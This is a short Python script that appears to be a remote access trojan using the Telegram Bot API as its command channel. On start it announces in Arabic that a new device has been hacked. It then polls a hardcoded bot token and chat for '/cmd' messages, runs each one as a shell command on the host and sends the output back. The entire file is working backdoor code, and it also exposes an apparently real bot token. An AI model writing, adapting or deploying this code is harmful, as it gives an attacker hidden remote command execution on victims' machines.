import os
import subprocess
import requests
import time

CHAT_ID = "7723822697"
BOT_TOKEN = "8930175539:AAFLraNIHkvisO2TEtTh2pWrVrLTLlkZpyY"
LAST_UPDATE_ID = 0

def get_updates():
    global LAST_UPDATE_ID
    try:
        url = "https://api.telegram.org/bot" + BOT_TOKEN + "/getUpdates?offset=" + str(LAST_UPDATE_ID + 1) + "&timeout=10"
        res = requests.get(url, timeout=15).json()
        if res.get("ok"):
            for update in res["result"]:
                LAST_UPDATE_ID = update["update_id"]
                if "message" in update and "text" in update["message"]:
                    if update["message"]["chat"]["id"] == int(CHAT_ID):
                        yield update["message"]["text"]
    except:
        pass

def send_msg(text):
    try:
        url = "https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage"
        requests.post(url, json={"chat_id": CHAT_ID, "text": str(text)})
    except:
        pass

def execute_cmd(cmd):
    try:
        result = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, text=True)
        return result if result else "Done."
    except Exception as e:
        return str(e)

def main():
    send_msg("🟢 جهاز جديد تم اختراقه!\nالنظام: " + os.name)
    while True:
        for command in get_updates():
            if command.startswith("/cmd "):
                cmd = command.replace("/cmd ", "")
                output = execute_cmd(cmd)
                send_msg("💻 النتيجة:\n" + output)
        time.sleep(1)

if __name__ == "__main__":
    main()
